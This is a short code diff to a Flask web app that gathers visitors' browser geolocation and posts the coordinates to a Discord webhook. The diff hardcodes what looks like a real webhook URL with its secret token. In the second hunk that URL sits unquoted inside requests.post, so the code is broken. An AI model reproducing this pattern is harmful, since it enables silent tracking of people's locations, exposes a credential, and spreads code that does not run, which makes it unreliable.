@@ -11,7 +11,7 @@ except ImportError:
     import flask
 
 app = Flask(__name__)
-DISCORD_WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_URL_HERE"  # Replace with your actual Discord webhook URL
+DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1457199916337332450/8eoFX1GQUjS9YQyiOF0dIKt0LH0Ldfh4DgScD39iB_8vLMxrKIC00Uwqf6TkyMD3TQCB"  # Replace with your actual Discord webhook URL
 
 HTML_PAGE = """
 <!DOCTYPE html>
@@ -61,7 +61,7 @@ def send_location():
         "content": f"User shared location: Latitude: {data['latitude']}, Longitude: {data['longitude']}"
     }
     
-    response = requests.post(DISCORD_WEBHOOK_URL, json=payload)
+    response = requests.post(https://discord.com/api/webhooks/1457199916337332450/8eoFX1GQUjS9YQyiOF0dIKt0LH0Ldfh4DgScD39iB_8vLMxrKIC00Uwqf6TkyMD3TQCB, json=payload)
     if response.status_code == 204:
         return "Location sent successfully!"
     else:
